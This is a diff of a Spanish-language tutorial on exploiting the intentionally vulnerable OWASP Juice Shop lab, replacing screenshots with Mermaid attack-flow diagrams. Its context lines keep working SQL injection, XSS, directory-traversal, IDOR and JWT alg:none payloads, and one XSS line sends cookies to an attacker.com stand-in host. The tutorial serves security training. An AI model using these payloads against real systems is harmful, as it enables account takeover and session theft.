@@ -95,7 +95,35 @@ docker ps | grep juice-shop
 # http://localhost:3000
 ```
 
-![OWASP Juice Shop - Página principal mostrando el catálogo de productos con navbar superior](images/juice-shop/juice-shop-homepage.png){width=80%}
+```mermaid
+flowchart TB
+    subgraph Client["Frontend (Angular)"]
+        A[Navbar] --> B[Search Bar]
+        A --> C[Login Button]
+        A --> D[Basket Icon]
+        B --> E[Product Cards]
+    end
+    subgraph Server["Backend (Express.js)"]
+        F[Auth API] --> G[Products API]
+        F --> H[Basket API]
+        F --> I[User API]
+    end
+    subgraph DB["Database (SQLite)"]
+        J[(Users)]
+        K[(Products)]
+        L[(Baskets)]
+    end
+    Client -->|HTTP/REST| Server
+    Server -->|SQL| DB
+    classDef client fill:#3b82f6,stroke:#1e40af,color:#fff
+    classDef server fill:#10b981,stroke:#047857,color:#fff
+    classDef db fill:#f59e0b,stroke:#b45309,color:#fff
+    class A,B,C,D,E client
+    class F,G,H,I server
+    class J,K,L db
+```
+
+*Figura 1: Arquitectura de OWASP Juice Shop — SPA Angular + API REST Express + SQLite*
 
 ### Verificación del Entorno
 
@@ -121,7 +149,24 @@ Juice Shop incluye un panel de progreso integrado que trackea los challenges res
 http://localhost:3000/#/score-board
 ```
 
-![Score Board de Juice Shop mostrando challenges completados y pendientes](images/juice-shop/score-board.png){width=80%}
+```mermaid
+gantt
+    title Juice Shop Challenge Progress
+    dateFormat  X
+    axisFormat %s
+    section Easy (1-2★)
+    Login Admin      :done, 0, 10
+    DOM XSS          :done, 10, 20
+    IDOR Basket      :done, 20, 30
+    section Medium (3-4★)
+    Reflected XSS    :active, 30, 40
+    Directory Traversal :active, 40, 50
+    section Hard (5-6★)
+    JWT Tampering    :crit, 50, 60
+    API XSS          :crit, 60, 70
+```
+
+*Figura 2: Score Board — Progreso de challenges por dificultad*
 
 ::: {.callout-warning}
 ## ADVERTENCIA DE AISLAMIENTO
@@ -274,7 +319,23 @@ curl -X POST http://localhost:3000/rest/user/login \
   -d "{\"email\":\"' OR 1=1 --\",\"password\":\"anything\"}"
 ```
 
-![Burp Suite mostrando la petición POST al endpoint /rest/user/login con el payload SQLi en el body](images/juice-shop/burp-sqli-login.png){width=80%}
+```mermaid
+sequenceDiagram
+    participant U as Attacker
+    participant B as Browser
+    participant S as Juice Shop Server
+    participant D as SQLite DB
+    U->>B: Email: ' OR 1=1--
+    U->>B: Password: anything
+    B->>S: POST /rest/user/login
+    S->>D: SELECT * FROM Users WHERE email='' OR 1=1--'
+    D-->>S: Returns ALL users (first=admin)
+    S-->>B: 200 OK + JWT (role:admin)
+    B-->>U: Logged in as admin@juice-sh.op
+    Note over U,D: SQL Injection bypasses authentication
+```
+
+*Figura 3: Flujo de ataque SQLi — Login Admin bypass*
 
 ### 💥 Cómo explotarla
 
@@ -338,7 +399,19 @@ WHERE email = '' OR 1=1 --'
 7. Ver respuesta con token JWT
 ```
 
-![Burp Suite Repeater mostrando la petición modificada con el payload SQLi y la respuesta con el token JWT del admin](images/juice-shop/burp-repeater-sqli.png){width=80%}
+```mermaid
+flowchart LR
+    A[POST /rest/user/login] --> B[Content-Type: application/json]
+    B --> C["Body: {"email":"' OR 1=1--","password":"x"}"]
+    C --> D[Response 200 OK]
+    D --> E["{"authentication":{"token":"eyJ...","umail":"admin@juice-sh.op"}}"]
+    classDef req fill:#3b82f6,stroke:#1e40af,color:#fff
+    classDef resp fill:#10b981,stroke:#047857,color:#fff
+    class A,B,C req
+    class D,E resp
+```
+
+*Figura 4: Burp Suite — Request SQLi y respuesta con JWT de admin*
 
 **Verificación del éxito**:
 
@@ -527,7 +600,22 @@ http://localhost:3000/search?q=<img src=x onerror=alert(1)>
 # Si aparece un alert → DOM XSS confirmado
 ```
 
-![Firefox DevTools Console mostrando el payload XSS ejecutándose con un alert(1) disparado por onerror](images/juice-shop/dom-xss-alert.png){width=80%}
+```mermaid
+flowchart TB
+    A[User Input: <iframe src="javascript:alert('xss')">] --> B[Angular Search Component]
+    B --> C{bypassSecurityTrustHtml()}
+    C -->|Sanitization DISABLED| D[Render in DOM]
+    D --> E[<iframe> executes JavaScript]
+    E --> F[alert('xss') popup]
+    classDef input fill:#ef4444,stroke:#b91c1c,color:#fff
+    classDef process fill:#f59e0b,stroke:#b45309,color:#fff
+    classDef output fill:#10b981,stroke:#047857,color:#fff
+    class A input
+    class B,C,D process
+    class E,F output
+```
+
+*Figura 5: DOM XSS — Flujo de sanitización desactivada en Angular*
 
 ### 💥 Cómo explotarla
 
@@ -585,7 +673,21 @@ http://localhost:3000/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert%28document.coo
 6. Verificar ejecución en el navegador
 ```
 
-![Burp Suite mostrando la interceptación de la petición GET con el parámetro q conteniendo el payload XSS](images/juice-shop/burp-dom-xss.png){width=80%}
+```mermaid
+sequenceDiagram
+    participant U as User
+    participant B as Burp Proxy
+    participant S as Server
+    participant D as Browser DOM
+    U->>B: Search: <iframe src="javascript:alert(1)">
+    B->>S: GET /rest/products/search?q=<iframe...>
+    S-->>B: 200 OK (JSON response)
+    B-->>U: Forward response
+    U->>D: Angular renders unsanitized HTML
+    D-->>U: alert(1) executes
+```
+
+*Figura 6: Burp Suite — Interceptación de petición con payload XSS*
 
 ### 🛡️ Cómo mitigarla
 
@@ -772,7 +874,22 @@ http://localhost:3000/search?q=<img src=x onerror="fetch('https://attacker.com/?
 6. Ejecuta el JavaScript → alert(1) se dispara
 ```
 
-![Navegador mostrando la página de resultados de búsqueda con el payload XSS reflejado ejecutándose](images/juice-shop/reflected-xss-execution.png){width=80%}
+```mermaid
+flowchart LR
+    A[Malicious URL] --> B[http://localhost:3000/#/track-result]
+    B --> C[?id=<iframe src="javascript:alert('xss')">]
+    C --> D[Server reflects 'id' in response]
+    D --> E[Browser renders unsanitized HTML]
+    E --> F[XSS executes]
+    classDef url fill:#ef4444,stroke:#b91c1c,color:#fff
+    classDef flow fill:#f59e0b,stroke:#b45309,color:#fff
+    classDef exec fill:#10b981,stroke:#047857,color:#fff
+    class A,B,C url
+    class D flow
+    class E,F exec
+```
+
+*Figura 7: Reflected XSS — URL maliciosa con payload en parámetro*
 
 ### 🛡️ Cómo mitigarla
 
@@ -923,7 +1040,30 @@ PASO 3: Probar alg:none
   └── Enviar como nuevo token
 ```
 
-![jwt.io mostrando un token JWT decodificado con header, payload y signature visibles](images/juice-shop/jwt-decoded.png){width=80%}
+```mermaid
+flowchart TB
+    subgraph Header["Header (Base64)"]
+        A1[{"alg":"HS256"}]
+        A2[{"typ":"JWT"}]
+    end
+    subgraph Payload["Payload (Base64)"]
+        B1[{"data":{"email":"user@juice-sh.op"}}]
+        B2[{"role":"customer"}]
+        B3[{"iat":1234567890}]
+    end
+    subgraph Signature["Signature (HMAC)"]
+        C1[HMAC-SHA256(header.payload, secret)]
+    end
+    Header -->|.| Payload -->|.| Signature
+    classDef h fill:#3b82f6,stroke:#1e40af,color:#fff
+    classDef p fill:#f59e0b,stroke:#b45309,color:#fff
+    classDef s fill:#10b981,stroke:#047857,color:#fff
+    class A1,A2 h
+    class B1,B2,B3 p
+    class C1 s
+```
+
+*Figura 8: Estructura JWT — Header, Payload, Signature*
 
 ### 💥 Cómo explotarla
 
@@ -1015,7 +1155,32 @@ print(f"Status: {resp.status_code}")
 print(f"Response: {resp.json()}")
 ```
 
-![Terminal mostrando el script Python ejecutándose y devolviendo datos del usuario admin con el token manipulado](images/juice-shop/jwt-alg-none-exploit.png){width=80%}
+```mermaid
+flowchart TB
+    subgraph Original["Original JWT"]
+        A1[alg: HS256] --> A2[email: user@juice-sh.op]
+        A2 --> A3[role: customer]
+        A3 --> A4[Valid Signature]
+    end
+    subgraph Forged["Forged JWT (alg:none)"]
+        B1[alg: none] --> B2[email: jwtn3d@juice-sh.op]
+        B2 --> B3[role: admin]
+        B3 --> B4[Signature: (empty)]
+    end
+    subgraph Result["Server Accepts"]
+        C1[No signature verification]
+        C2[User impersonated as admin]
+    end
+    Forged --> Result
+    classDef orig fill:#3b82f6,stroke:#1e40af,color:#fff
+    classDef forged fill:#ef4444,stroke:#b91c1c,color:#fff
+    classDef result fill:#10b981,stroke:#047857,color:#fff
+    class A1,A2,A3,A4 orig
+    class B1,B2,B3,B4 forged
+    class C1,C2 result
+```
+
+*Figura 9: JWT alg:none — Token forjado sin firma*
 
 ### 🛡️ Cómo mitigarla
 
@@ -1212,7 +1377,22 @@ curl http://localhost:3000/rest/basket/1 \
 6. El atacante ve productos, cantidades, precios de otro usuario
 ```
 
-![Burp Suite mostrando múltiples peticiones GET a /rest/basket/1, /rest/basket/2, /rest/basket/3 con respuestas exitosas](images/juice-shop/basket-idor-burp.png){width=80%}
+```mermaid
+flowchart LR
+    A[Authenticated User] --> B[GET /rest/basket/5]
+    B --> C{Server checks ownership?}
+    C -->|NO| D[Returns basket data]
+    C -->|YES| E[403 Forbidden]
+    D --> F[Attacker sees other user's cart]
+    classDef attacker fill:#ef4444,stroke:#b91c1c,color:#fff
+    classDef server fill:#f59e0b,stroke:#b45309,color:#fff
+    classDef vuln fill:#10b981,stroke:#047857,color:#fff
+    class A,B attacker
+    class C,D server
+    class E,F vuln
+```
+
+*Figura 10: IDOR — Enumeración de carritos sin verificación de ownership*
 
 **Enumeración sistemática**:
 
@@ -1449,7 +1629,22 @@ curl "http://localhost:3000/ftp/%252e%252e%252fpackage.json"
 # %25 = % → se decodifica dos veces
 ```
 
-![Navegador mostrando el contenido de un archivo del sistema accedido mediante directory traversal](images/juice-shop/directory-traversal-result.png){width=80%}
+```mermaid
+flowchart TB
+    A[Request: /ftp/eastere.gg] --> B[Server serves /ftp/ directory]
+    A2[Request: /ftp/../../../etc/passwd] --> C{Path validation?}
+    C -->|Weak| D[Traversal succeeds]
+    C -->|Strong| E[403 Forbidden]
+    D --> F[Attacker reads system files]
+    classDef req fill:#ef4444,stroke:#b91c1c,color:#fff
+    classDef check fill:#f59e0b,stroke:#b45309,color:#fff
+    classDef breach fill:#10b981,stroke:#047857,color:#fff
+    class A,A2 req
+    class C,D check
+    class E,F breach
+```
+
+*Figura 11: Directory Traversal — Escape de directorio restringido*
 
 **Script de enumeración**:
 
@@ -1734,7 +1929,21 @@ curl -X POST http://localhost:3000/api/Feedback \
 6. Visitar la página de feedback → script se ejecuta
 ```
 
-![Burp Suite mostrando la petición POST al endpoint /api/Feedback con el payload XSS stored en el body JSON](images/juice-shop/burp-stored-xss.png){width=80%}
+```mermaid
+sequenceDiagram
+    participant A as Attacker
+    participant API as /api/Feedback
+    participant DB as Database
+    participant Admin as Admin Panel
+    A->>API: POST {"comment":"<script>alert(1)</script>"}
+    API->>DB: INSERT INTO Feedback (no sanitization)
+    DB-->>API: 201 Created
+    Admin->>DB: SELECT * FROM Feedback
+    DB-->>Admin: Returns unsanitized comment
+    Admin-->>Admin: <script> executes in admin browser
+```
+
+*Figura 12: Stored XSS — Inyección via API y ejecución en panel admin*
 
 **Verificación del impacto**:
 
